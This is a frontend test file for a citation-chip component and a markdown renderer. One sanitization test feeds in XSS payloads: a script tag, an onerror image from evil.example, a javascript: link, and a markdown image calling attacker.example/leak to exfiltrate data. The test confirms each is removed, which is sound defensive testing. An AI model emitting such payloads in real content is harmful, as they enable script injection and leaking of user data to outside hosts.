import { fireEvent, render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { CitationChip } from "@/components/common/citation-chip";
import { MarkdownContent } from "@/components/common/markdown-content";
import type { Citation } from "@/lib/api/types";

const SAMPLE_CITATIONS: Citation[] = [
  {
    id: 1,
    doc_id: "outage-sla",
    title: "Outage Credits and SLA",
    section: "Outage credit table",
    snippet: "More than 24 and up to 48 hours | 5 days of credit",
    score: 0.91,
  },
  {
    id: 2,
    doc_id: "billing-payments",
    title: "Billing, Payments and Refunds",
    section: "Refunds",
    snippet: "Approved refunds are returned within 7 to 10 business days.",
    score: 0.85,
  },
];

describe("CitationChip", () => {
  it("renders numbered chip and triggers onSelect on click", () => {
    const onSelect = vi.fn();
    render(
      <CitationChip
        citation={SAMPLE_CITATIONS[0]}
        onSelect={onSelect}
        showTitle
      />,
    );

    const button = screen.getByTestId("citation-1");
    expect(button).toHaveTextContent("[1]");
    expect(button).toHaveTextContent("Outage Credits and SLA");

    fireEvent.click(button);
    expect(onSelect).toHaveBeenCalledTimes(1);
    expect(onSelect).toHaveBeenCalledWith(SAMPLE_CITATIONS[0]);
  });
});

describe("MarkdownContent with citations and sanitization", () => {
  it("turns [1] and [1, 2] into clickable citation chips without altering unknown [99]", () => {
    const onSelect = vi.fn();
    render(
      <MarkdownContent
        content={
          "You get 5 days of credit [1] after verification [1, 2]. Ignore `[1]` and [99]."
        }
        citations={SAMPLE_CITATIONS}
        onSelectCitation={onSelect}
      />,
    );

    const chipsOne = screen.getAllByTestId("citation-1");
    const chipTwo = screen.getByTestId("citation-2");
    expect(chipsOne).toHaveLength(2);
    expect(chipTwo).toBeInTheDocument();
    expect(screen.queryByTestId("citation-99")).not.toBeInTheDocument();
    expect(screen.getByText(/\[99\]/)).toBeInTheDocument();

    fireEvent.click(chipTwo);
    expect(onSelect).toHaveBeenCalledWith(SAMPLE_CITATIONS[1]);
  });

  it("drops external images and sanitizes dangerous HTML and javascript URLs (SEC-4)", () => {
    const { container } = render(
      <MarkdownContent
        content={
          'Safe text ![leak](https://attacker.example/leak?x=1) <script>window.__xss=1</script><img src="https://evil.example/x.png" onerror="alert(1)" /> [click](javascript:alert(1))'
        }
      />,
    );

    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    const link = container.querySelector("a");
    if (link) {
      expect(link.getAttribute("href") ?? "").not.toContain("javascript:");
    }
  });

  it("highlights cited snippet phrases across markdown table cells", () => {
    const markdown = [
      "| Continuous outage | Credit |",
      "|---|---|",
      "| More than 24 and up to 48 hours | 5 days of credit |",
    ].join("\n");

    render(
      <MarkdownContent
        content={markdown}
        highlightSnippet="More than 24 and up to 48 hours | 5 days of credit"
      />,
    );

    const highlights = screen.getAllByTestId("highlighted-snippet");
    expect(highlights.length).toBeGreaterThanOrEqual(2);
    expect(highlights.map((el) => el.textContent)).toEqual([
      "More than 24 and up to 48 hours",
      "5 days of credit",
    ]);
  });
});
